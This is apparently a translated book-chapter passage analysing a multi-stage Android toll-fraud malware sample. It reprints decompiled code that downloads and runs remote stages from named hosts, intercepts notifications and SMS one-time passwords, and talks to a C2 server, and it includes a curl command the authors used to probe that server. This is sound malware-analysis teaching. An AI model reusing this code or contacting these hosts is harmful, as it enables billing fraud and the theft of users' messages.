`p` 方法乍一看很令人畏惧，因为它有近 50 行混淆代码。然而，开发者在这里犯了一些额外的错误，因此逆向工程 `p` 方法变得容易了。为了简洁起见，我们省略了完整的代码，而是在本节中构建了相关部分。

请记住，这个方法最重要的方面是它的返回值，它必须是输入到反射 API 中的解密字符串。去掉除了返回值指令之外的所有指令后，代码如列表 3-8 所示。

```
public final String p(String str) {
  return sb.toString();
}
```

*列表 3-8：简化为只包含返回值的 p 方法*

因为我们真正关注的是`sb`的内容，现在我们需要引入所有对`sb`值有贡献的代码行。在 jadx 中，我们可以选择变量`sb`来突出显示所有其他使用它的地方。添加这些行生成了清单 3-9 中的代码。

```
public final String p(String str) {
  StringBuilder sb = new StringBuilder();

  if (sb.length() % 2 == 0) {
    sb.append(str.charAt(length));
  }
  else {
    sb.append(str.charAt(length));
  }

  return sb.toString();
}
```

*清单 3-9：包含对 sb 的引用的 p 方法*

由于这段代码扩展引入了另一个变量`length`，我们还需要添加所有操作此变量的代码行。我们在清单 3-10 中执行此操作。

```
public final String p(String str) {
  StringBuilder sb = new StringBuilder();

  int length = (str.length() - 1) + (-5);
  while (length >= 0) {
    if (sb.length() % 2 == 0) {
      sb.append(str.charAt(length));
      length -= 4;
    }
    else {
      sb.append(str.charAt(length));
      length -= 2;
    }
  }

  return sb.toString();
}
```

*清单 3-10：完整的解密方法*

最后一步并没有引入更多的变量，所以我们完成了。在`p`的 50 行原始代码中，只有这些行对字符串解密有贡献。恶意软件作者添加了其余的代码来误导我们。在 Java 中编译并运行此代码确认它将字符串`qmqMRa3e34OrqtqLdSAnAjne4p4ssoXYOMh`解密为`openStream`，这是通过反射查找的方法名称。

允许我们迅速恢复解密代码的关键错误是，开发人员将原始指令与混淆指令混合在一起，但保持了原始代码的数据流与混淆代码的数据流完全分开。因此，代码最初看起来难以阅读且难以跟踪，但当我们只关注变量及其相互影响时，就能轻松提取原始代码，而无需考虑混淆。

解密方法的体积较小，使我们能够手动追踪数据流。为了避免将来进行类似的手动工作，我们可以编写使用编译器理论中的技术（如使用定义链）自动执行这些步骤的代码。

#### ***解密类中的所有字符串***

现在我们已经理解了解密方法并在 Java 中重建了它，我们可以轻松解码`d.b`类中的所有字符串。除非恶意软件开发人员进一步努力隐藏这种连接，否则混淆或加密字符串的长度与其重要性之间通常存在强烈的相关性。以`PnPt`开头的字符串似乎是最长的，果然，一旦解码，它转换为一个 URL。

解码后的 URL 与我们之前在`d.a`类中找到的相同。通过连接到该 URL，我们能够下载一个名为*ban*的文件，其中包含下一阶段的代码。`d.b`中的其余代码下载此代码文件并通过反射 API 加载它。我们将此过程的后续操作留给读者作为练习。

### **恶意软件的第二阶段**

*ban*文件比`d.b`类要小得多，且混淆程度较低。在恶意软件的后期阶段，通常会发现这种情况，因为它们通常包含更少的功能。恶意软件开发人员可能还认为其第一阶段已经足够保护。

*ban*文件包含两个包，*yin.**和*com.**。*yin.**包只包含三个小类。其中一个，`yin.Chao`，是由第一阶段中的`d.b`加载的，如清单 3-11 所示。

```
Class<?> cls = Class.forName( 
  p("2r2++eEdEysahohVVLdsdOUsCaCN9lJCJnBxyeyXoD-.
  o7mjejHrtjsjF:yisi2B.4k4K5iovoH5lWaWildMY.W:"));
  ...
Class<?> cls2 = (Class) ((Method) j(
  cls, p("WC6sGsGJlaVlVteC=d=J:anonPkleEBJ-"))).invoke(
    newInstance, p("fofRiawhwZyCx.xF-nViVkrysJ4iJ"));
```

*清单 3-11：恶意软件通过加密字符串混淆了对 yin.Chao 的调用。*

这三个混淆的字符串按顺序解密为`dalvik.system.DexClassLoader`、`loadClass`和`yin.Chao`。

#### ***入口点***

尽管代码足够小，可以直接阅读，但让我们使用结构化的方法来寻找分析中的有趣入口点。这种方法确保我们不会错过有趣的功能。

由于*ban*是一个动态加载的插件文件，我们对它的分析将与第一阶段的分析在一些重要方面有所不同。最重要的一点是，插件文件没有清单文件，这使得查找权限或入口点变得更加困难。实际上，插件没有预定义的入口点。加载插件的代码可以声明插件应该开始运行的类和方法。

##### 权限

像*ban*这样的插件文件只能使用加载它们的应用程序清单文件中声明的权限。了解这一点后，我们可以简单地回顾之前发现的权限。在 jadx 中搜索*permission*会返回*ban*的两个不同部分。在`com.gppp.hk.b.b`类中，一个字符串数组提到了`READ_PHONE_STATE`和`READ_CONTACTS`权限。在`com.gppp.hk.a.a`类中，代码请求了这些权限。在本章稍后的部分，你将看到恶意软件使用`READ_PHONE_STATE`权限来访问设备的电话号码。`READ_CONTACTS`的使用仍不明确。

当然，*ban*可能还会使用主应用程序清单文件中声明的其他权限。作为练习，可以尝试使用之前讨论过的权限映射来查找受权限保护的 API 调用。

##### 主要入口点

我们提到过，加载插件的代码可以决定插件执行从哪里开始。为了找到这个入口点，我们需要重新查看第一阶段的`d.b`类，在这个类中，经过解密的字符串`fofRiawhwZyCx.xF-nViVkrysJ4iJ`解密为`yin.Chao`。解密后，它的第一个方法也叫做`yin`。如果我们找不到更好的线索，从`yin.Chao`开始是一个不错的选择，因为这将帮助我们从恶意软件执行的第一行代码开始理解其第二阶段。

##### 活动、服务和广播接收器

除了*ban*的主要入口点外，我们还可以寻找活动、服务和广播接收器。使用 jadx 的搜索功能显示了一个活动和一个服务，但没有广播接收器。

虽然`com.gufra.base_normal.MainActivity`活动似乎未使用，但`com.gppp.hk.b.a`中的服务非常重要。这是通知监听器`com.bp.statis.bloodsugar.PE`的基类，它代表恶意软件拦截应用通知。在本节稍后，我们将更详细地解释这个服务。

注意，`com.gppp.hk.b.a`还有其他服务子类，但应用无法运行它们，因为它们没有在清单文件中声明。我们将忽略这些服务，因为它们看起来是死代码。

##### 反分析技巧与隐藏代码

虽然第二阶段没有包含本地代码或使用加密包*javax.crypto*，但我们可以找到一些有趣的反射 API 的使用。在 jadx 中搜索*reflect*会显示五个实例，其中`com.gppp.hk.a.b.a`最为相关，因为它包含了另一个 URL 字符串。稍后在本章中进一步描述，这个类负责下载并运行恶意软件的第三阶段。

##### 字符串和 API 名称

除了与权限、反射相关的功能，以及前面提到的用于下载第三阶段的 URL 外，通过搜索字符串和方法名称几乎没有其他可发现的内容。

例如，搜索*sms*返回了一行，其中恶意软件检查它是否是系统中配置的默认短信处理程序，但仅此而已。第二阶段实在是太小，无法发现其他内容。

#### ***yin.Chao.yin 方法***

让我们来看看`yin.Chao.yin`方法，这是主应用执行插件的入口。如列表 3-12 所示，它启动了一个新线程，从中调用了其他几个方法。

```
public static void yin(final Context context, final String str) {
  new Thread(new Runnable() { // from class: yin.Chao.1
    @Override // java.lang.Runnable
    public void run() {
      try {
        Hook.hook2(context, str);
      } catch (Exception e) {
        e.printStackTrace();
      }
      ((Application) context).registerActivityLifecycleCallbacks(new a(r3));
      try {
        Thread.sleep(1000L);
      } catch (InterruptedException e2) {
        e2.printStackTrace();
      }
       Chao.Nti(context, r3);
       b.a(context);
    }
  }).start();
}
```

*列表 3-12：yin.Chao.yin 方法是恶意软件第二阶段的入口。*

随便看一下这些其他方法，我们可以发现最后两个方法`Chao.Nti`和`b.a`可能比较有趣。`Chao.Nti`中的代码，如列表 3-13 所示，检查用户是否已经授予应用处理所有其他应用发送的通知的权限。如果没有，应用会显示一个对话框，要求授予该权限。

```
public static void Nti(Context context, String str) {
  try {
    Class<?> cls = Class.forName(str);
    String string = Settings.Secure.getString(
      context.getContentResolver(), "enabled_notification_listeners");
    if (string == null || !string.contains(context.getPackageName())) {
      Intent intent = new Intent();
      intent.setAction(
        "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
      intent.putExtra(
        "android.provider.extra.APP_PACKAGE", context.getPackageName());
      intent.addFlags(805306368);
      context.startActivity(intent);
    } else {
      c.a(context, cls);
    }
  } catch (Exception unused) {
  }
}
```

*列表 3-13：Chao.Nti 尝试获取对所有应用通知的访问权限。*

回想一下我们之前看到的一个用于处理应用通知的服务，它在清单文件中声明，但我们找不到相关的代码。这个方法似乎就是它。

`b.a`方法，其完全限定名为`com.gppp.hk.a.b.a`，更为有趣。如列表 3-14 所示，它打开了一个与*https://xn3o.oss-accelerate.aliyuncs.com/xn3o*的连接，从那里下载了另一个代码阶段，并通过`DexClassLoader` API 执行下载的代码。

```
HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(
  "https://xn3o.oss-accelerate.aliyuncs.com/xn3o").openConnection();
httpURLConnection.connect();
if (httpURLConnection.getResponseCode() == 200) {
  InputStream inputStream = httpURLConnection.getInputStream();
  FileOutputStream fileOutputStream = new FileOutputStream(file);
  byte[] bArr = new byte[1024];
  while (true) {
    int read = inputStream.read(bArr);
    if (-1 == read) {
      break;
    } 
    fileOutputStream.write(bArr, 0, read);
  }
  if (file.exists()) {
    Class loadClass2 = new DexClassLoader(
      file.getPath(), file.getAbsolutePath(), "", 
      context.getClassLoader()).loadClass("com.xn3o");
    Log.i("fb_nor", "c" + loadClass2.getName());
    Method method2 = loadClass2.getMethod("xn3o", Context.class);
    Log.i("fb_nor", "m" + method2.getName());
    method2.invoke(null, context);
  }
}
```

*列表 3-14：com.gppp.hk.a.b.a 方法下载恶意软件的第三阶段。*

`yin.Chao.yin`方法中的其他两个方法似乎不太有趣。`Hook.hook2`方法包含将应用的默认类加载器与新的类加载器合并的代码。其代码似乎是从中文来源的 Android 插件教程中复制过来的，这提醒我们在分析过程中始终要查找任何类型的模板代码。对`registerActivityLifecycleCallbacks`的调用注册了一个回调，在应用生命周期的各个阶段提示用户授予某些权限。

#### ***com.*包***

在进入第三阶段之前，让我们快速看看*ban*的第二个包，*com.**。它包含了很多子包，虽然名字不同，但代码相似。例如，在*com.bp.statis.bloodsugar*包中，我们发现了一个类，`PE`。这是在清单文件中声明的通知监听服务。它的代码很简短，因为它只是将传入的通知转发给父类`com.gppp.hk.b.a`。*com.**包中的大多数其他子包结构类似。我们可以推测，子包的名称属于同一恶意软件家族的其他样本。

父类`com.gppp.hk.b.a`中的代码同样很简短。请参见列表 3-15，它接收传入的通知，通过广播消息将它们转发到应用的其他部分，然后将原始通知隐藏起来。

```
private void post(StatusBarNotification statusBarNotification) {
  CharSequence charSequence = 
    statusBarNotification.getNotification().extras.getCharSequence(
      "android.text");
  if (!TextUtils.isEmpty(charSequence)) {
    Intent intent = new Intent("action_text");
    intent.putExtra("android.text", charSequence.toString());
    sendBroadcast(intent);
  }
  cancelAllNotifications();
}
```

*列表 3-15：com.gppp.hk.b.a 类拦截来自设备上所有其他应用的通知。*

这段代码使用了在清单文件中未声明的上下文注册消息和广播接收器。在其他地方，可能是在同一应用程序中，我们应该能够找到一个监听`action_text`类型广播的广播接收器。定位这个广播接收器可能会比较棘手，但在这个特定的恶意软件样本中并不难。如果你在恶意软件的第三阶段代码中搜索*action_text*，你会找到它。

总结来说，第二阶段的全部目的是确保应用程序能够访问系统中所有应用的通知。它拦截通知并将其内容发送到第三阶段，第二阶段还会下载并执行第三阶段。

### **恶意软件的第三阶段**

这个恶意软件样本的第三个也是主要阶段包含了大部分的恶意功能。它比前两个阶段有更多的类和代码。在 jadx 中加载第三阶段会看到*com*和*vgy7.vgy7.vgy7.vgy7.**包中的代码。

这两个包非常不同。*com*包只包含一个类，`com.xn3o`。*vgy7.vgy7.vgy7.vgy7.**包包含了分布在多个子包中的 10 个类。恶意软件的作者花了一些功夫来混淆变量名和字符串，但仍然可以大致看出发生了什么。例如，类`vgy7.vgy7.vgy7.vgy7.vgy7`包含了一些未完全混淆的字符串，这些字符串暗示了网络、电话和 JavaScript 的功能。

不幸的是，第三阶段的代码太大，无法在本章中完全解释。它包含了大量的自定义代码，用于操控某些高级服务的注册页面并破坏它们的反机器人保护措施。本阶段的所有代码都贡献了恶意功能，因此很难完全忽视某些包。相反，我们仅描述第三阶段分析的开始部分。

#### ***jadx 反编译问题***

反编译*com.xn3o.xn3o*中的代码超出了 jadx 的能力范围，这种情况偶尔会发生，特别是在你尝试加载更大更复杂的代码块时。作为一个初步的解决方法，可以尝试使用 jadx 的一个选项，叫做*显示不一致的代码*，它会显示那些无法被正确反编译的代码部分。不一致的代码大多是正确的，但并不完美。当遇到一些需要准确理解的方法时，比如解密方法，最好请别人提供第二意见。

你可以通过使用其他 Android 反编译工具来获得第二意见。例如，Bytecode Viewer 工具包含六个不同的 Android 反编译器。通常，至少其中一个能够为任何 Android 应用生成合理的反编译代码。

#### ***入口点***

只有 11 个类，便可以手动扫描整个代码，找出感兴趣的功能。但是，为了提高我们的逆向工程效率，让我们回到之前介绍的技术，寻找入口点：查看权限；主要入口点；活动、服务和广播接收器；反分析技巧和隐藏代码；以及字符串和 API 名称。

##### 权限

和第二阶段一样，第三阶段是一个动态加载的插件，这意味着它所需的权限必须在主应用的清单文件中声明。在 jadx 中搜索权限会显示`SEND_SMS`和`RECEIVE_SMS`权限的引用。由于这两个权限在第一阶段的清单文件中没有声明，*xn3o*将无法使用它们。很可能，*xn3o*被许多不同的恶意软件应用加载，其中一些应用可以访问一个或两个 SMS 权限。或者，该应用可能会提示用户安装更新版本的自己，这些新版本声明了这些权限，但在这个特定的恶意软件中我们并没有看到这样的功能。

尽管这个应用无法使用 SMS 权限，但我们仍然认为了解它们在加载到其他应用中时如何使用是值得的。列表 3-16 中的第一行调用了`bhu8`方法，该方法间接调用了`PackageManager.checkPermission`方法来检查`RECEIVE_SMS`权限的可用性。第二行检查`SEND_SMS`权限。结果被存储在两个变量中，之后发送到恶意软件的指挥与控制服务器。

```
bhu8 = vgy7.vgy7.vgy7.vgy7.bhu8.bhu8(context);
if (context.getPackageManager().checkPermission(
    "android.permission.SEND_SMS", context.getPackageName()) != 0) {
  z3 = false;
}
```

*列表 3-16：恶意软件的第三阶段检查 RECEIVE_SMS 和 SEND_SMS 权限。*

现在我们知道*xn3o*在有 SMS 权限时会使用它，我们可以在 jadx 中搜索*sms*，以展示几个进入恶意功能的入口点。类`vgy7.vgy7.vgy7.vgy7.bhu8`包含对 API `sendTextMessage`的引用，而`vgy7.vgy7.vgy7.vgy7.cft6.bhu8`则包含接收和处理来电短信的代码。除了 SMS 权限外，*xn3o*似乎没有检查其他权限。

##### 主要入口点

*xn3o*的主要入口点由第二阶段*ban*定义。列表 3-17 显示，第三阶段的执行从`com.xn3o`类的`xn3o`方法开始。

```
Class loadClass = new DexClassLoader(
  file.getPath(), file.getAbsolutePath(), "", 
  context.getClassLoader()).loadClass("com.xn3o");
Log.i("fb_nor", "c" + loadClass.getName());
Method method = loadClass.getMethod("xn3o", Context.class);
Log.i("fb_nor", "m" + method.getName());
method.invoke(null, context);
```

*列表 3-17：*ban* 中的代码执行了第三阶段的*com.xn3o.xn3o*方法。*

如果我们没有找到更好的线索，可以从那里开始尝试理解第三阶段的功能。现在，让我们考虑其他可能的入口点。

##### 活动、服务和广播接收器

我们还可以查找活动、服务和广播接收器。使用 jadx 的搜索功能只显示了两个广播接收器，其他没什么特别的内容。第一个广播接收器处理由第二阶段使用`android.text`发送的消息。回想一下，这个广播包含了拦截的应用通知。查看从列表 3-18 的最后一行调用的`bhu8.vgy7`方法，发现该应用将拦截的通知存储在列表中以便后续处理。

```
@Override // android.content.BroadcastReceiver
public void onReceive(Context context, Intent intent) {
  String stringExtra = intent.getStringExtra(this.f5vgy7);
  if (TextUtils.isEmpty(stringExtra)) {
    stringExtra = intent.getStringExtra("android.text");
  }
  if (TextUtils.isEmpty(stringExtra)) {
    stringExtra = intent.getStringExtra("at");
    if (!TextUtils.isEmpty(stringExtra) && !Telephony.Sms.getDefaultSmsPackage(
        bhu8.this.f2vgy7).equals(intent.getStringExtra("ap"))) {
      return;
    }
  }
  bhu8.vgy7(stringExtra);
}
```

*列表 3-18：第一个广播接收器处理先前拦截的应用通知。*

第二个广播接收器（列表 3-19）处理传入的短信。它调用相同的`bhu8.vgy7`方法来存储和处理之前用来处理拦截通知的拦截消息。唯一的不同是，如果短信以*rch*开头，它还会向命令与控制服务器发送请求。

```
public void onReceive(Context context, Intent intent) {
  vgy7.vgy7.vgy7.vgy7.mko0.vgy7 vgy7Var;
  Object[] objArr = (Object[]) intent.getExtras().get(
    vgy7.vgy7.vgy7.vgy7.vgy7.c);
  if (objArr != null) {
    for (Object obj : objArr) {
      SmsMessage createFromPdu = SmsMessage.createFromPdu((byte[]) obj);
      String messageBody = createFromPdu.getMessageBody();
      if (messageBody != null && messageBody.startsWith("rch")) {
        new Thread(new vgy7(this, "http://" + vgy7.vgy7.vgy7.vgy7.vgy7.wsx2 +
          "/op/pair?remote=" + vgy7.vgy7.vgy7.vgy7.bhu8.bhu8 + "&device_id=" +
          messageBody.substring(3) + "&number=" + URLEncoder.encode(
            createFromPdu.getOriginatingAddress()))).start();
      }
      bhu8 bhu8Var = bhu8.zse4;
      if (!(bhu8Var == null || (vgy7Var = bhu8Var.mko0) == null)) {
        vgy7Var.mko0("sms_from:" + createFromPdu.getOriginatingAddress());
      }
      bhu8.vgy7(createFromPdu.getMessageBody());
    }
  }
}
```

*列表 3-19：第二个广播接收器拦截传入的短信进行处理。*

恶意软件为何寻找*rch*尚不清楚。一个可能性是，恶意软件作者通过发送这些消息与恶意软件进行通信，作为替代 HTTP 命令与控制服务器的方式。

##### 反分析技巧与隐藏代码

寻找典型的反分析技巧在第三阶段也有效。虽然没有原生代码或使用加密包*javax.crypto*，但我们可以找到一些有趣的*android.util.Base64*用法。在列表 3-20 中，你可以看到一个方法，它使用 Base64 编码一个字节数组，然后将编码后的字节数组传递给另一个函数。

```
public static byte[] vgy7(byte[] bArr) {
  return vgy7(Base64.encodeToString(bArr, 2), true).getBytes();
}
```

*列表 3-20：恶意软件使用 Base64 编码和自定义加密与服务器通信。*

正如你很快将看到的，这个其他函数`vgy7`负责加密和解密恶意软件与其命令与控制服务器的通信。

##### 字符串和 API 名称

除了与权限、短信和编码相关的功能外，我们还可以通过搜索字符串和方法名来揭示一些其他有趣的代码部分。搜索*HTTP*可以显示嵌入的 URL，以及来自*java.net*包的代码，这些代码用于连接到这些 URL。在本章稍后的部分，你将了解到，这些 URL 是用于与恶意软件的命令与控制服务器通信。

#### ***名称混淆***

现在我们已经找到了许多继续分析的方法，接下来我们需要使混淆代码更具可读性。逆向工程师工具箱中最重要的工具之一就是重命名变量、方法、类和其他名称的能力。恶意软件开发者喜欢用名称混淆技术来对抗恶意软件分析师，因此你经常需要逆转这些技术，以恢复原始代码。

重命名混淆名称不仅让代码更容易理解。这种做法还帮助你跟踪已经分析过的代码。当你看到一个解混淆后的名称时，你就不必担心自己是否已经见过它；即使它是像*unknown_string*或*not_sure*这样的名称，你也能更容易地识别出这个人类可读的名称。大胆地重命名混淆名称，即使你还不完全理解某个名称的用途。

在解开名字混淆的同时，我们还建议为它们引入一些结构。尽管这种风格在现代软件开发中已不常见，我们发现*匈牙利命名法*（一种在变量名中包含类型信息的命名规范）对于这一目的非常有用。例如，你可以将一个整数命名为`iLen`，将一个字符串命名为`strName`，等等。你甚至可以用这种命名方式来解开方法名的混淆，比如使用`getStrName`来表示一个简单的获取函数，它返回一个我们称之为`name`的字符串。

最后，名称解混淆可以减少视觉负担。尝试将长名称重命名为短名称，将包含数字或 Unicode 字符的名称重命名为仅由 ASCII 字符组成的简单名称。对于你遇到的每个名称混淆技术，考虑它为何出现，然后使用你工具的重命名功能来抵消这种效果。名称混淆技术的开发者认为只使用随机的 Unicode 字符、将所有名称缩短为单个字符，甚至改变文本方向使得名称从上到下而非从左到右阅读是聪明的做法。然而，对于逆向工程师而言，所有这些技术都让他们更容易发现混淆名和已经解混淆的名称之间的区别。如果所有名称都是随机的英语名词，或者正如我们在实际恶意软件中看到的那样，名称来自代码的原始源代码，但被随机交换，以至于恶意软件使用了例如`int socket`和`Socket i`，而不是`int i`和`Socket socket`，这对逆向工程师来说就会变得更加混乱。

在掌握了这些名称解混淆的概念后，让我们尝试解混淆一段第三阶段的代码。列表 3-21 展示了原始代码，其中的混淆名称保持不变。

```
public static void xn3o(android.content.Context p14) {
  android.util.Log.e(vgy7.vgy7.vgy7.vgy7.vgy7.bhu8, p14.getPackageName());
  android.content.Context v5_0 = p14.getApplicationContext();
  if (vgy7.vgy7.vgy7.vgy7.bhu8.qaz1 == null) {
    String v0_12;
    vgy7.vgy7.vgy7.vgy7.bhu8.qaz1 = vgy7.vgy7.vgy7.vgy7.vgy7.wsx2;
    vgy7.vgy7.vgy7.vgy7.bhu8.vgy7 = v5_0.getSharedPreferences("bshwai", 0);
    vgy7.vgy7.vgy7.vgy7.bhu8.vgy7();
    vgy7.vgy7.vgy7.vgy7.bhu8.bhu8 =
      vgy7.vgy7.vgy7.vgy7.bhu8.vgy7.getInt("bshwai", 0);
    vgy7.vgy7.vgy7.vgy7.bhu8.mko0 =
      vgy7.vgy7.vgy7.vgy7.bhu8.vgy7.getString("tffhhk", 0);
    android.telephony.TelephonyManager v0_11 = 
      ((android.telephony.TelephonyManager)v5_0.getSystemService("phone"));
    if (v0_11 != null) {
      v0_12 = v0_11.getSimOperator();
      if (android.text.TextUtils.isEmpty(v0_12)) {
        v0_12 = "";
      }
    }
    vgy7.vgy7.vgy7.vgy7.bhu8.cft6 = v0_12;
```

*列表 3-21：由 jadx 生成的原始混淆代码*

让我们通过删除冗长的包名称以减少视觉过载，提供有意义的名称，使用匈牙利命名法来提供易于访问的类型信息，并将不做任何操作的代码标记为*noOp*（无操作），来清理这些内容。未经过混淆的版本，如 Listing 3-22 所示，易于理解得多。

```
public static void xn3o(android.content.Context context) {
  android.util.Log.e(Constants.strDrizzt, context.getPackageName());
  android.content.Context context = context.getApplicationContext();
  if (Utils.urlUtansy == null) {
    String strSimOperator;
    Utils.urlUtansy = Constants.urlUtansy;
    Utils.prefBshwai = context.getSharedPreferences("bshwai", 0);
    Utils.noOp();
    Utils.intSettingBhswai = Utils.prefBshwai.getInt("bshwai", 0);
    Utils.strSettingTffhhk = Utils.prefBshwai.getString("tffhhk", 0);
    android.telephony.TelephonyManager telephonyManager = 
      ((android.telephony.TelephonyManager)context.getSystemService("phone"));
    if (telephonyManager != null) {
      strSimOperator = telephonyManager.getSimOperator();
      if (android.text.TextUtils.isEmpty(strSimOperator)) {
        strSimOperator = "";
      }
    }
    Utils.strSimOperator = strSimOperator;
```

*Listing 3-22：使用 jadx 重命名功能清理后的代码*

我们仍然不知道`bshwai`和`tffhhk`中的偏好设置是什么，或者`urlUtansy`网址的用途是什么，但至少我们可以相对流畅地阅读转换后的代码。另请注意，我们给两个不同的变量起了相同的名称`context`。在编程中，这通常是大忌，因为编译器不允许在同一作用域中有两个同名的变量。然而，在逆向工程中，这是完全可以接受的，甚至可能是鼓励的。例如，将每个无趣的名称重命名为下划线（`_`）可以显著减少认知负担。

### **指挥与控制服务器通信**

在本节中，我们将展示一些*xn3o*的片段，解释欺诈应用是如何工作的。执行第三阶段是动态的，指挥与控制服务器告诉恶意软件应该做什么，以及按什么顺序做。为了跟上这个过程，你必须理解恶意软件是如何与服务器通信的。

你会注意到我们不再处于纯静态分析的范畴了。在这一点上，单纯依赖静态方法已经太过局限。要理解恶意软件如何与其指挥与控制服务器通信，通常更容易直接运行恶意软件并拦截流量。然而，为了让本章专注于静态分析，我们将在下一章中介绍动态分析工具，而集中讨论我们可以从代码中获取的信息。

正如你所看到的，这款应用通过直接的运营商账单欺诈或话费欺诈，在用户不知情或不愿意的情况下为其注册付费服务。有些话费欺诈作为纯粹的社交工程骗局，通过显示类似钓鱼的注册页面，诱使用户自己完成注册过程。然而，本文展示的话费欺诈使用了第二种常见技术：通过 Android 和 JavaScript API 模拟用户操作，未经用户察觉地为其注册付费服务。尽管所有这些过程都是自动化的，恶意软件仅执行几个关键步骤：

+   加载一个转发到付费服务的推荐网站。

+   使用代码自动与付费服务页面交互，并在用户未同意的情况下为其订阅付费服务。

+   拦截并提取通过短信发送的一次性密码。

+   将一次性密码粘贴到付费服务页面以完成注册。

大多数话费欺诈应用使用大致相同的框架。掌握了这些知识后，我们现在可以重新审视恶意软件的第三阶段，看看它是如何完成这些步骤的。

#### ***检查加密算法***

与命令与控制服务器的所有通信都使用在 `vgy7.vgy7.vgy7.vgy7.bhu8` 类中找到的简单算法进行加密。回想一下，我们在示例 3-20 中发现了这个 `vgy7` 方法。示例 3-23 展示了它的实现，它接受两个参数。第二个参数控制第一个参数传递的字符串是加密（`z = true`）还是解密（`z = false`）。

```
public static String vgy7(String str, boolean z) {
  int i = 0;
  if (z) {
    Random random = new Random();
    char[] charArray = str.toCharArray();
    StringBuilder sb = new StringBuilder();
    char charAt = "abcdefghijklmnopqrstuvmxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".charAt(
      random.nextInt(13));
    char charAt2 = "abcdefghijklmnopqrstuvmxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".charAt(
      random.nextInt(13) + 13);
    int i2 = (charAt2 - charAt) + 5;
    sb.append(charAt2);
    sb.append(charAt);
    char charAt3 = "abcdefghijklmnopqrstuvmxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".charAt(
      random.nextInt(52));
    while (i < charArray.length) {
      if (i % i2 == 0) {
        sb.append(charAt3);
      }
      sb.append(charArray[i]);
      i++;
    }
    return sb.toString();
  }
  int charAt4 = (str.charAt(0) - str.charAt(1)) + 5;
  char[] charArray2 = str.substring(2).toCharArray();
  StringBuilder sb2 = new StringBuilder();
  while (i < charArray2.length) {
    if (i % (charAt4 + 1) != 0) {
      sb2.append(charArray2[i]);
    }
    i++;
  }
  return sb2.toString();
}
```

*示例 3-23：vgy7 方法可以加密和解密与命令与控制服务器的通信。*

该加密算法显然是自创的，且非常弱。要加密一个字符串，它首先随机选择一个小写字母和一个大写字母。然后，将第二个字母的 ASCII 码减去第一个字母的 ASCII 码，再加上五。加密后的输出字符串以这两个随机字母开头，接着是需要加密的输入字符串的字母。在减法结果加五后等于零的字符串位置，算法会插入一个没有任何意义的随机字符。例如，加密字符串的第三个字符（换句话说，是转换后输入字符串的第零个字符）始终是一个随机字符，因为零对任何值取模总是零。

#### ***从命令行探测服务器***

现在我们已经了解了加密和解密的工作原理，我们可以编写一个小脚本与恶意软件的命令与控制服务器进行交互，探测其命令和响应。由于加密和解密过程只包含一个方法，我们已将 jadx 中的代码粘贴到两个文件中，分别是 *Encrypt.java* 和 *Decrypt.java*，可以从命令行运行。在这里，我们使用 Linux 命令行与恶意软件的服务器进行交互：

```
$ echo -n '{"josiwo": "com.bp.statis.bloodsugar", "worikt": "20610",
    "zubfih": "1646292590992_", "qredyb": 30, "kdthit": 6 }' |
  xargs -0 java Encrypt |
  curl https://www.utansy.com/xn3o/in -s -d @- |
  xargs java Decrypt
```

这个命令将通过应用程序收集的 JSON 参数进行编码（稍后会在本节中解释），将命令传递给我们的*加密*脚本，同时使用 `-n` 标志去除换行符，将加密后的负载以静默（`-s`）和 POST（`-d`）模式通过 cURL 传输，并解密从服务器接收到的命令。输出大致如下：`"bshwai": 5320786, "xjnguw": ""`。

**注意**

*由于命令与控制服务器通常生命周期较短，我们不指望你在阅读本书时能进行实验，命令与控制服务器仍然存在。不幸的是，这将限制你进行动态分析的能力。*

#### ***向服务器注册***

现在我们可以向服务器发送加密的有效负载，并解密其响应，我们可以开始了解恶意软件是如何与服务器通信的。在这里，我们将通过模拟恶意软件在与比利时 Orange 运营商的移动网络连接的真实设备上运行时，展示恶意软件与其指挥与控制服务器之间传输的信息。由于恶意软件使用`worikt`字段的值来识别手机的移动运营商，通过将此值更改为其他移动运营商的标识符，我们可以轻松地在不同国家的不同移动运营商之间进行实验。

恶意软件首次与指挥与控制服务器建立连接时，会向服务器注册。它使用加密的 JSON 发送注册信息到*https://www.utansy.com/xn3o/in*，服务器响应一个加密的 JSON 对象，恶意软件解密并处理它。

在所有加密的 JSON 通信实例中，恶意软件开发者将 JSON 字段的有意义名称替换为乱码名称，以迷惑分析人员。你可以在列表 3-24 中看到这种情况，该列表显示了在注册阶段发送到指挥与控制服务器的解密 JSON 对象。

```
{
  "josiwo": "com.bp.statis.bloodsugar",
  "worikt": "20610",
  "zubfih": "1646292590992_",
  "qredyb": 30,
  "kdthit": 6
}
```

*列表 3-24：注册消息的解密有效负载*

要理解这些乱码名称，最好从两个方面来解决问题。当你在代码中看到乱码的 JSON 字段时，记录它们被赋予的值。然后，在你看到解密通信中的乱码 JSON 字段时，也做同样的事情。我们可以根据字段的赋值推测一些字段的含义，例如`josiwo`。而像`kdthit`这样的字段，其含义必须通过代码检查来找出。

幸运的是，恶意软件并没有试图隐藏代码中的乱码字符串，也没有在不同的上下文中重复使用相同的乱码名称。例如，在 jadx 中搜索`josiwo`只会返回一个位置，如列表 3-25 所示。此代码包含与列表 3-24 中解密的 JSON 对象完全相同的字段名称。我们可以安全地假设，这段代码负责为这些乱码字段分配值。

```
org.json.JSONObject v1_3 = new org.json.JSONObject();
try {
  v1_3.put("josiwo", v0_2.getPackageName());
} catch (java.io.IOException v0) {
  v0_3 = 0;
} catch (org.json.JSONException v0) {
}
v1_3.put("worikt", bhu8.cft6);
v1_3.put("zubfih", bhu8.xdr5);
v1_3.put("qredyb", android.os.Build$VERSION.SDK_INT);
v1_3.put("kdthit", 6);
nji9.nji9 v1_7 = new nji9.bhu8(0).vgy7.bhu8.vgy7("xn3o/in").toString(),
  bhu8.vgy7(v1_3.toString().getBytes()));
```

*列表 3-25：构建注册消息的 JSON 有效负载*

通过这些额外的上下文信息，我们可以看出，`josiwo`显然是恶意软件应用程序自己的包名，而`qredyb`是设备的 SDK 构建级别。字符串`kdthit`始终是数字 6，但它的含义尚不明确。也许它是一个版本代码，用于帮助客户端和服务器协商通信协议。

